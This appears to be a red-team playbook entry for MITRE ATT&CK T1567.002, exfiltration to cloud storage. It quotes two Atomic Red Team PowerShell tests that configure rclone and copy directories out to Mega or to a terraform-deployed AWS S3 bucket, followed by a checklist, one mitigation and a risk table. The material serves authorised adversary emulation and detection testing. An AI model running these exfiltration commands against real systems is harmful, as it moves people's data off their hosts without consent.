---
name: "T1567.002_exfiltration-to-cloud-storage"
description: "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1567.002
  - exfiltration
  - esxi
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1567.002"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - ESXi
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1567/002"
tech_stack:
  - esxi
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1567
  - T1567.001
  - T1567.003
  - T1567.004
prerequisites:
  - T1567
severity_boost:
  T1567: "Chain with T1567 for deeper attack path"
  T1567.001: "Chain with T1567.001 for deeper attack path"
  T1567.003: "Chain with T1567.003 for deeper attack path"
---

# T1567.002 Exfiltration to Cloud Storage

> **Sub-technique of:** T1567

## High-Level Description

Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** ESXi, Linux, macOS, Windows

## What to Check

- [ ] Identify if Exfiltration to Cloud Storage technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Exfiltration to Cloud Storage
- [ ] Check Linux systems for indicators of Exfiltration to Cloud Storage
- [ ] Check macOS systems for indicators of Exfiltration to Cloud Storage
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Exfiltrate data with rclone to cloud Storage - Mega (Windows)

This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/

**Supported Platforms:** windows

```powershell
New-Item #{rclone_config_path}\rclone -ItemType directory
New-Item #{rclone_config_path}\rclone\rclone.conf
cd "#{rclone_path}"
.\rclone.exe config create #{remote_share} mega
set-Content #{rclone_config_path}\rclone\rclone.conf "[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"
.\rclone.exe copy --max-size 1700k "#{dir_to_copy}" #{remote_share}:test -v
```

**Dependencies:**

- rclone must exist at (#{rclone_path})

### Atomic Test 2: Exfiltrate data with rclone to cloud Storage - AWS S3

This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/

**Supported Platforms:** linux, macos

```powershell
Write-Host "Deploying AWS infrastructure... " -NoNewLine
$awsAccessKey = "#{aws_access_key}"
$awsSecretKey = "#{aws_secret_key}"
cd PathToAtomicsFolder/T1567.002/src/
if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
  $env:AWS_PROFILE = "#{aws_profile}"
} else {
  $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
  $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
}
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var "aws_region=#{aws_region}" -auto-approve
Write-Host "Done!"
Write-Host "Generating rclone config... " -NoNewLine
$config = @"
[exfils3]
type = s3
provider = AWS
env_auth = true
region = #{aws_region}
"@
$config | Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf" -Encoding ascii
Write-Host "Done!"
Write-Host "Exfiltrating data... " -NoNewLine
$bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)".Replace("`"","")
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
$null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/" exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
Write-Host "Done!"
```

**Dependencies:**

- rclone must exist at (#{rclone_path})
- terraform must exist at (#{terraform_path})
- Must provide a valid directory or file path to exfiltrate to AWS S3

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Exfiltration to Cloud Storage by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1567.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1021 Restrict Web-Based Content

Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.

## Detection

### Detection Strategy for Exfiltration to Cloud Storage

## Risk Assessment

| Finding                                            | Severity | Impact       |
| -------------------------------------------------- | -------- | ------------ |
| Exfiltration to Cloud Storage technique applicable | Low      | Exfiltration |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [Atomic Red Team - T1567.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1567.002)
- [MITRE ATT&CK - T1567.002](https://attack.mitre.org/techniques/T1567/002)
